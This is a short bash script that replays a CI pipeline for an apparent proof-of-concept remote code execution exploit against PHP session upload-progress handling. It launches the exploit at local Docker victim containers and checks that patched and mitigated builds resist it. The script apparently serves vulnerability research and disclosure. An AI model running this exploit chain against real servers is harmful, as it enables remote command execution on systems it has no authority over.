#!/usr/bin/env bash
# Local mirror of the CI end-to-end sequence (.github/workflows/ci.yml):
# same order, same steps - stops at the first failure, like CI does.
set -euo pipefail

cd "$(dirname "$0")/.."

echo "== unit tests"
python3 -m pytest tests/ -q

echo "== stage 1: deterministic splice"
python3 -u poc/stage1_splice.py

echo "== stage 2: real OOM-interrupted pwrite"
python3 -u poc/stage2_oom.py

echo "== fresh target for the remote exploit"
rm -f sessions/sess_*
docker compose -p phpaftershell up -d --force-recreate --wait victim
curl -sf http://127.0.0.1:8087/ >/dev/null

echo "== charge trace (diagnostic)"
python3 -u poc/charge_trace.py 8087 | sed -n '1,6p'

echo "== remote exploit (100% HTTP)"
python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 \
  --command 'id' --attempts 80

echo "== cross-SAPI: same chain against nginx + php-fpm"
python3 -u ./phpaftershell-poc --target http://127.0.0.1:8090 \
  --command 'id' --attempts 40

echo "== control: patched 8.4.28 must NOT be exploitable"
! python3 -u ./phpaftershell-poc --target http://127.0.0.1:8088 \
  --command 'id' --attempts 8

echo "== control: mitigated target writes no progress record"
SID=$(python3 -c 'import uuid; print(uuid.uuid4().hex)')
curl -s -m 5 -b "PHPSESSID=$SID" -F 'PHP_SESSION_UPLOAD_PROGRESS=tok' \
  -F 'file=@/etc/hostname;filename=c.txt' --limit-rate 1k \
  http://127.0.0.1:8089/index.php >/dev/null &
sleep 2
docker exec phpaftershell-mitigated-1 sh -c \
  "! grep -q upload_progress_ /tmp/sess_${SID} 2>/dev/null"

echo "ALL GREEN"
